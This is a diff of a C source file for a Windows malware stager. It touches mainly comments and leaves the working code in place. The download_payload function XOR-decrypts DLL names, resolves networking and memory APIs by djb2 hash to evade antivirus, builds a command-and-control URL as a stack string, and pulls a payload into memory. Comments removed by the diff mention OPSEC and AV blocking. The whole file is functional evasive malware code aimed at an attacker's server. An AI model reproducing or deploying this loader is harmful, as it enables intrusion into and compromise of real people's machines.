@@ -3,7 +3,7 @@
 #include "evasion.h"
 #include <stdio.h>
 
-// --- typedefs definition
+// --- TYPEDEFS DEFINITION
 typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
 typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
 typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
@@ -12,17 +12,14 @@ typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD fl
 typedef BOOL (WINAPI *pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 
 char* download_payload(SIZE_T* payload_size) {
-    // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
     
+    // --- ENCODED STRINGS DEFINITION
     char enc_wininet[] = { 0x28, 0x1a, 0x1b, 0x19, 0x5d, 0x16, 0x47, 0x4d, 0x16, 0x5f, 0x18, 0x6b };
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
-    
-    // using "Mozilla/5.0" as user agent
-    // MODIFY: use /tools/string_encryptor.py to change user agent
-    char enc_user_agent[] = { 0x12, 0x1c, 0x0f, 0x19, 0x5f, 0x1f, 0x52, 0x4c, 0x47, 0x1d, 0x44, 0x6b };
+    char enc_user_agent[] = { 0x12, 0x1c, 0x0f, 0x19, 0x5f, 0x1f, 0x52, 0x4c, 0x47, 0x1d, 0x44, 0x6b };     // "Mozilla/5.0"
 
-    // API hashes
+    // --- API HASHES DEFINITION
     DWORD hash_IntOpen = 0xF4AD70A1;      // djb2 for "InternetOpenA"
     DWORD hash_IntOpenUrl = 0x8F5CA3B4;   // djb2 for "InternetOpenUrlA"
     DWORD hash_IntReadFile = 0xFB4F8EAA;  // djb2 for "InternetReadFile"
@@ -30,24 +27,21 @@ char* download_payload(SIZE_T* payload_size) {
     DWORD hash_VirtAlloc = 0x382C0F97;    // djb2 for "VirtualAlloc"
     DWORD hash_VirtFree = 0x668FCF2E;     // djb2 for "VirtualFree"
 
-    // --- load DLLs dynamically
+    // --- DYNAMIC DLL LOAD
     
-    // wininet.dll
+    // wininet
     xor_crypt(enc_wininet, sizeof(enc_wininet), cypher_key, cypher_key_len);
     HMODULE hWinINet = LoadLibraryA(enc_wininet);
-    // OPSEC: recypher DLL name immediately
     xor_crypt(enc_wininet, sizeof(enc_wininet), cypher_key, cypher_key_len);
 
-    // kernel32.dll
+    // kernel32
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
-    // OPSEC: recypher DLL name immediately
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
 
-    // if DLL loading fails -> return
     if (!hWinINet || !hKernel32) return NULL;
 
-    // --- dynamic resolution via hashing
+    // --- DYNAMIC API RESOLUTION VIA HASHING
 
     pInternetOpenA fnInternetOpenA = (pInternetOpenA) get_api_by_hash(hWinINet, hash_IntOpen);
     pInternetOpenUrlA fnInternetOpenUrlA = (pInternetOpenUrlA) get_api_by_hash(hWinINet, hash_IntOpenUrl);
@@ -56,10 +50,9 @@ char* download_payload(SIZE_T* payload_size) {
     pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc) get_api_by_hash(hKernel32, hash_VirtAlloc);
     pVirtualFree fnVirtualFree = (pVirtualFree) get_api_by_hash(hKernel32, hash_VirtFree);
 
-    // if AV blocks a function -> return
     if (!fnInternetOpenA || !fnInternetOpenUrlA || !fnInternetReadFile || !fnInternetCloseHandle || !fnVirtualAlloc || !fnVirtualFree) return NULL;
 
-    // --- download file logic
+    // --- PAYLOAD DOWNLOAD LOGIC
     
     xor_crypt(enc_user_agent, sizeof(enc_user_agent), cypher_key, cypher_key_len);
     HINTERNET hInternet = fnInternetOpenA(enc_user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -67,7 +60,6 @@ char* download_payload(SIZE_T* payload_size) {
 
     if (!hInternet) return NULL;
 
-    // construct C2 URL via stack string
     C2_URL(c2_url, url_len);
 
     // open connection to C2 server
@@ -78,7 +70,6 @@ char* download_payload(SIZE_T* payload_size) {
     }
 
     // prepare memory buffer to hold payload (35 MB)
-    // MODIFY: increment buffer size if payload is bigger
     SIZE_T buffer_size = 35 * 1024 * 1024;
     
     char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -92,7 +83,7 @@ char* download_payload(SIZE_T* payload_size) {
     DWORD bytes_read = 0;
     DWORD total_bytes_read = 0;
 
-    // --- read file logic
+    // --- PAYLOAD READ LOGIC
     do {
         if (!fnInternetReadFile(hUrl, payload_buffer + total_bytes_read, 1024, &bytes_read)) {
             break; // reading error
@@ -111,7 +102,6 @@ char* download_payload(SIZE_T* payload_size) {
         return NULL;
     }
 
-    // save payload size
     *payload_size = total_bytes_read;
     return payload_buffer;
 }
